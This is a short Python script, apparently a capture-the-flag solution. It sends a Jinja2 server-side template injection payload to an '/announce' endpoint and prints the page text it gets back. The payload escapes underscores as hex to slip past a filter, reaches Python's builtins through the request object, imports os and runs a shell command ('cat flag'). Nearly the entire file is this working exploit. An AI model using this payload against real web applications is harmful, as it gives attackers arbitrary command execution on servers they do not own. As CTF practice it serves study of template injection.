import requests as r 
from bs4 import BeautifulSoup as bs
url = ""
announceUrl = url+"/announce"
data = {
    'content':r"""{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}"""
    }

response = r.post(announceUrl,data)
soup = bs(response.text, 'html.parser')
Flag = soup.get_text()
print(Flag)